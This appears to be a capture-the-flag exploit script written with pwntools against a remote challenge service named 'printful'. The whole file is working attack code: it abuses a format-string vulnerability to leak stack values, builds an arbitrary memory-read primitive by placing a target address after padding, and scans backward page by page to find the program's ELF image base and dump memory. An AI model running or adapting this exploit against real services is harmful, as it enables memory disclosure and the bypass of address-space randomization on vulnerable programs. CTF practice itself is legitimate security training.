#!/usr/bin/env python3

import struct

from pwn import *

chal = remote("printful.challs.pwnoh.io", 1337, ssl=True)


def wait_til_prompt():
    return chal.recvuntil(b"> ")


def dump_address(address, format="p"):
    # [adr][formatstring][EOF]
    # [format][padding............][EOF][addr]

    leak_part = f"|%24${format}|EOF_prnt".encode()
    out = leak_part.ljust(136, b"A") + b"EOF_prnt" + struct.pack("Q", address)
    chal.sendline(out)

    return chal.recvuntil(b"EOF_prnt")[: -len(b"EOF_prnt")].split(b"|")[1]


def leak_position(position, format="p"):
    chal.sendline(f"%{position}${format}EOF_prnt".encode())
    return chal.recvuntil(b"EOF_prnt")[: -len(b"EOF_prnt")]


def get_image_base_address():
    page_aligned_image_leak = int(leak_position(34), 16) & ~0xFFF
    original_page_aligned_image_leak = page_aligned_image_leak

    while True:
        wait_til_prompt()
        if b"ELF" in dump_address(page_aligned_image_leak, "s"):
            break
        page_aligned_image_leak -= 0x1000

    print(f"page_aligned_image_leak: {page_aligned_image_leak:x}")
    print(f"original_page_aligned_image_leak: {original_page_aligned_image_leak:x}")

    return page_aligned_image_leak


wait_til_prompt()
image_base_address = get_image_base_address()

wait_til_prompt()
print(dump_address(0x4242424141414141, "p"))
wait_til_prompt()
print(dump_address(image_base_address, "p"))
wait_til_prompt()
print(dump_address(image_base_address, "s"))
